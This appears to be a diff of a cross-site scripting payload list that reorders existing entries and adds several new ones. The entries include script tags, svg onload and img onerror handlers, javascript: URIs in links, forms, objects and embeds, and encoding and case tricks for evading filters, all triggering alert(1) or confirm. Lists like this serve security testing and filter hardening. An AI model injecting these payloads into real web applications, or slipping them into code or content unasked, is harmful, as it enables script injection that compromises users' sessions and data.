@@ -1,14 +1,17 @@
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">x</a>
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><button>x</button></form>
+<img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+"><img src=x onerror=confirm`1`>
+<math><mtext></p><script>alert(1)</script>
+<object data="javascript:alert(1)">
+<sCript>alert(1)</sCript>
+<script>eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</script>
+<script>\u0061lert(1)</script>
+<svg onload="alert(1)"//
+<svg/onload=alert(1)//
 <svg onload=alert%26%230000000040%26%230000000041>
 <svg onload=alert&#40;1&#41;>
 <svg onload=alert&#x28;1&#x29;>
-<svg/onload=alert(1)//
-<svg onload="alert(1)"//
-<sCript>alert(1)</sCript>
-<script>\u0061lert(1)</script>
-<script>eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</script>
-<img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
-"><img src=x onerror=confirm`1`>
-<object data="javascript:alert(1)">
-<embed src="javascript:alert(1)">
-<a href="javascript:alert(1)">click</a>
-<a href=javascript:alert(1)>click</a>
